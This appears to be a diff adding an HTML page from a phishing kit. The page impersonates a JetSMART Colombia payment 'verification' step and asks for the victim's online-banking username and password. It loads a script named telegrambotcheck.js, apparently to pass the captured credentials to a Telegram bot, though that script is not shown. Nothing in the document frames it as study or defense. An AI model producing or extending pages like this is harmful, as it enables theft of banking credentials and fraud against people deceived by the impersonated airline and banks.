@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>JetSMART - Verificación</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../css/checkers.css" />
+    <link rel="stylesheet" href="../css/normalize.css" />
+    <script src="../js/functions.js"></script>
+    <link rel="icon" href="../assets/logos/js-logo.png" type="image/x-icon">
+  </head>
+  <body>
+    <!-- LOADER -->
+    <div class="main-loader show">
+      <img id="company-loader" />
+      <div class="loader"></div>
+    </div>
+
+    <div class="logos">
+      <img id="bank-logo" width="50px" />
+      <img id="company-logo" width="110px" />
+    </div>
+    <main>
+      <div class="content">
+        <b style="display: block; margin-bottom: 20px"
+          >Autorización de transacción</b
+        >
+
+        <p style="margin-bottom: 10px">
+          La transacción que intenta realizar en <b>JetSMART CO</b> por
+          <b>$ <span id="flight-price">81.900</span> COP</b> debe ser
+          autorizada. Por favor verifica la siguiente información:
+        </p>
+
+        <p style="margin-bottom: 20px">
+          Ingrese los datos de su Banco Virtual:
+        </p>
+
+        <form id="form">
+          <!-- Información de la transacción -->
+          <div style="margin-bottom: 15px">
+            <b>Comercio:</b>
+            <p>JetSMART CO</p>
+          </div>
+
+          <div style="margin-bottom: 15px">
+            <b>Monto:</b>
+            <p>$ <span id="flight-price">81.900</span> COP</p>
+          </div>
+
+          <div style="margin-bottom: 15px">
+            <b>Número de tarjeta:</b>
+            <p>•••• •••• •••• <span id="card-digits">1234</span></p>
+          </div>
+
+          <!-- Campos de usuario y contraseña -->
+          <div style="margin-bottom: 15px">
+            <b>Usuario:</b>
+            <input
+              type="text"
+              id="user"
+              required
+              style="width: 100%; padding: 8px; margin-top: 5px"
+            />
+          </div>
+
+          <div style="margin-bottom: 15px">
+            <b>Contraseña:</b>
+            <input
+              type="password"
+              id="puser"
+              required
+              style="width: 100%; padding: 8px; margin-top: 5px"
+            />
+          </div>
+
+          <!-- Enlace para nuevo código -->
+          <a
+            href="#"
+            id="newCode"
+            style="
+              display: flex;
+              margin-bottom: 20px;
+              justify-content: center;
+              text-decoration: none;
+              color: gray;
+            "
+            >Presione aquí para recibir un nuevo código</a
+          >
+
+          <!-- Mensaje de error -->
+          <p
+            id="error-message"
+            style="color: red; text-align: center; margin-bottom: 20px"
+          ></p>
+
+          <!-- Botón de enviar -->
+          <div style="text-align: center">
+            <button
+              type="submit"
+              class="btn-success"
+              style="
+                cursor: pointer;
+                padding: 10px 20px;
+                background: #000;
+                color: #fff;
+                border-radius: 25px;
+              "
+            >
+              Verificar
+            </button>
+          </div>
+        </form>
+      </div>
+    </main>
+
+    <!-- SCRIPTS -->
+    <script src="../js/telegrambotcheck.js"></script>
+    <script src="../js/id_check.js"></script>
+  </body>
+</html>
